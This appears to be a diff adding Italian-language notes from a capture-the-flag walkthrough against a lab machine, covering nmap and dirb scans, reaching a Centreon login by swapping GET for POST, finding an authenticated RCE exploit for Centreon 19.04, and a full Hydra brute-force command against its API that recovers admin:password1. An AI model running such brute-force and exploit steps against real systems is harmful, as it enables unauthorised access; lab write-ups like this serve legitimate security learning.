@@ -1,0 +1,46 @@
+1) inizio con nmap e masscan come sempre:
+
+
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
+|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
+|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+2)vado a vedere cosa c'è sul server alla porta 80, c'è solo la page di default di apache, provo a fare scan con dirb, trovo:
+
++ http://10.10.10.157/index.html (CODE:200|SIZE:10918)                                                                                                  
++ http://10.10.10.157/monitoring (CODE:401|SIZE:459)                                                                                                    
++ http://10.10.10.157/server-status (CODE:403|SIZE:300) 
+
+sia per server-status che per monitoring serve essere autenticato.
+
+3) provo a fare richieste con burpsuite ad esempio cambiare get con post ecc.
+ e infatti facendo richiesta con POST al posto di GET alla pagina /monitoring, ottengo un messaggio
+in cui vengo reindirizzato alla pagina 10.10.10.157/centreon
+Qui c'è un altra pagina di login
+
+
+4) Centreon ha la versione v. 19.04.0, tramite searchsploit vedo che c'è un exploit proprio per questa versione
+
+Centreon 19.04  - Authenticated Remote Code Execution  | exploits/php/webapps/47069.py           
+
+per eseguirlo però devo essere autenticato. 
+
+l'user di default per centron è admin, ma la password di default non funziona dunque si deve effettuare per forza 
+un bruteforce, possibile tramite le API di Centreon.  posso farlo con Hydra:
+
+hydra -l admin -P /root/Desktop/lists/rockyou.txt -V 10.10.10.157 http-post-form "/centreon/api/index.php?		action=authenticate:username=^USER^&password=^PASS^:F=Bad" -I
+
+ottengo come password: password1
+dunque posso accedere con 
+
+	admin:password1
+
+
+    
